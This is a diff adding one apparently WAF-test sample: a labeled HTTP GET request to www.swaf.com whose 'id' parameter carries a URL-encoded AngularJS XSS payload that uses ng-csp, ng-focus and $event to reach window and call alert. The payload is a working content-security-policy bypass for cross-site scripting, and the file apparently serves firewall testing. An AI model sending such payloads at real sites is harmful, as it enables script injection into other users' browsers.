@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_框架_其他-06506766
+# 使用 ng-csp 指令启用 AngularJS 的内容安全策略（Content Security Policy）模式。
+GET /?id=%3Cdiv%20ng-app%20ng-csp%3E%3Cdiv%20ng-focus=%22x=$event%3B%22%20id=f%20tabindex=0%3Efoo%3C%2Fdiv%3E%3Cdiv%20ng-repeat=%22%28key%2C%20value%29%20in%20x.view%22%3E%3Cdiv%20ng-if=%22key%20==%20%27window%27%22%3E%7B%7B%20%5B1%5D.reduce%28value.alert%2C%201%29%3B%20%7D%7D%3C%2Fdiv%3E%3C%2Fdiv%3E%3C%2Fdiv%3E&bid=hd_tag_m8mv25cu HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25cu
+RM-PRO-Token: bd26f5c3efadae5e675cc7f68131cf61
+RM-PRO-Time: 1742808460318
+User-Agent: curl/7.83.1
+
